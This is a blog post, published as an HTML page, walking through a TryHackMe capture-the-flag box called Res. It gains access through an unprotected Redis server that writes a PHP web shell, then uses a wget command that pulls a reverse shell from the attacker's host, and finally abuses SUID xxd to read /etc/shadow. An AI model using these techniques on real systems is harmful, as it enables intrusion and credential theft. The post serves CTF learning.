@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>TryHackMe: Res - ben-dale.co.uk</title><meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<meta property="og:title" content="TryHackMe: Res" />
+<meta property="og:description" content="My write-up for Res, a TryHackMe box created by stuxnet." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/tryhackme-res/" />
+<meta property="article:published_time" content="2021-06-07T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-06-07T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="TryHackMe: Res"/>
+<meta name="twitter:description" content="My write-up for Res, a TryHackMe box created by stuxnet."/>
+<link rel="stylesheet" type="text/css" media="screen" href="/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="/css/main.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="/css/all.css" />
+</head>
+
+<body>
+	<div class="container wrapper">
+		<div class="header">
+	
+		<div class="avatar">
+			<a href="/">
+				<img src="/static/img/logo.png" alt="ben-dale.co.uk" />
+			</a>
+		</div>
+	
+	<h1 class="site-title"><a href="/">ben-dale.co.uk</a></h1>
+	<div class="site-description"><p>some guy that does some stuff</p><nav class="nav social">
+			<ul class="flat"><li class="li-social"><a href="https://github.com/ben-dale"><i title="Github" class="icons fab fa-github"></i></a></li><li class="li-social"><a href="https://twitter.com/mrbenjamind"><i title="Twitter" class="icons fab fa-twitter"></i></a></li><li class="li-social"><a href="https://keybase.io/mrbenjamind"><i title="Keybase" class="icons fab fa-keybase"></i></a></li></ul>
+		</nav>
+	</div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post">
+			<div class="author">
+				
+			</div>
+			<div class="post-header">
+				
+					<div class="meta">
+						<div class="date">
+							<span class="day">07</span>
+							<span class="rest">Jun 2021</span>
+						</div>
+					</div>
+				
+				<div class="matter">
+					<h1 class="title">TryHackMe: Res</h1>
+				</div>
+			</div>
+			<div class="markdown">
+				<p>Here&rsquo;s my write-up for <a href="https://tryhackme.com/room/res">Res</a>, a CTF challenge created by <a href="https://tryhackme.com/p/stuxnet">stuxnet</a>.</p>
+<h3 id="write-up">Write-up</h3>
+<p>I deployed the box using TryHackMe&rsquo;s interface and scanned the host using <code>nmap</code>:</p>
+<p><img src="/static/res/1.png" alt=""></p>
+<p>An Apache webserver was accessible on port 80, and on port 6379, Redis. I checked out port 80 which just returned the default Apache webpage. I set up <code>gobuster</code> to scan the server but killed it after five minutes as it didn&rsquo;t find anything, and I&rsquo;m pretty sure this wasn&rsquo;t the right track to be on. I also tried connecting to the redis instance using <code>redis-cli</code>, and found that it wasn&rsquo;t password protected.</p>
+<p>I remembered that there was a way to write to files on the system using Redis. I wondered if it was possible to write something to <code>/var/www/html</code> which is where the web-hosted files would probably be. If it was possible, I might be able to execute some code by via a web request.</p>
+<p><img src="/static/res/2.png" alt=""></p>
+<p><img src="/static/res/3.png" alt=""></p>
+<p><img src="/static/res/4.png" alt=""></p>
+<p>I used <code>redis-cli</code> to write a basic phpinfo script and placed it under <code>/var/www/html</code>, and loaded it up in my browser. It worked! Now that I had proved my theory, I replayed the steps, only this time creating a file called <code>shell.php</code> which contained <code>&lt;?php system($_GET['cmd']) ?&gt;</code>.</p>
+<p><img src="/static/res/5.png" alt=""></p>
+<p>I could now run commands through my shell script, but what I needed was a reverse shell.</p>
+<p><img src="/static/res/6.png" alt=""></p>
+<p>I set up my machine to host a reverse shell file (named <code>r_shell.php</code>) and downloaded the reverse shell onto the other machine using the shell already on there:</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">http://10.10.32.178/shell.php?cmd=wget+http://10.11.23.23:3000/r_shell.php
+</code></pre></div><p>I set up netcat and executed the reverse shell by visiting <code>http://10.10.32.178/r_shell.php</code></p>
+<p><img src="/static/res/7.png" alt=""></p>
+<p>After some enumeration, I found another user called &ldquo;vianka&rdquo; and I found that <code>xxd</code> had the SUID bit set on it. <a href="https://gtfobins.github.io/gtfobins/xxd/">GTFOBins</a> came to the rescue, once again, documenting a way to read files with elevated privileges.</p>
+<p><img src="/static/res/8.png" alt=""></p>
+<p><img src="/static/res/9.png" alt=""></p>
+<p><img src="/static/res/10.png" alt=""></p>
+<p>Using <code>xxd</code> I was able to read <code>/etc/shadow</code> and I cracked the user&rsquo;s password with <a href="https://www.openwall.com/john/">john</a>.</p>
+<p><img src="/static/res/11.png" alt=""></p>
+<p>The final flag I had to get was root&rsquo;s flag. The &ldquo;cheeky way&rdquo; is to read the flag using <code>xxd</code>, assuming it is in the usual location <code>/root/root.txt</code></p>
+<p><img src="/static/res/12.png" alt=""></p>
+<p>The &ldquo;correct&rdquo; way is to log into vianka&rsquo;s account using the cracked password and escalate the privileges. It turned out that vianka has full root permissions, so there wasn&rsquo;t much to escalate!</p>
+<h3 id="final-thoughts">Final thoughts</h3>
+<p>A nice little challenge, suitable for anyone getting into CTFs. Thank you stuxnet!</p>
+
+			</div>
+			<div class="tags">
+				
+				
+				
+				
+					
+				
+					
+				
+				
+			</div></div>
+	</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div class="footertext"></div>
+	</nav>
+</div>
+
+
+
+</body>
+</html>
